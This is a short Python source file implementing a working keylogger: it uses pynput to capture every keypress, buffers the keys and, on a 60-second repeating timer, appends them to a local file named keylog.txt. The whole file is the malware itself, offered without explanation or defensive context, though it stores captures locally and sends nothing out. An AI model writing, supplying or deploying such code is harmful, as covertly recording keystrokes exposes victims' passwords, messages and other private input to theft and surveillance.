import pynput.keyboard
import threading
import os

class Keylogger:
    def __init__(self, time_interval, file_name):
        self.log = ""
        self.interval = time_interval
        self.file_name = file_name

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def report(self):
        self.save_to_file()
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def save_to_file(self):
        with open(self.file_name, "a") as file:
            file.write(self.log)
            file.write("\n")

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()


keylogger = Keylogger(60, "keylog.txt")
keylogger.start()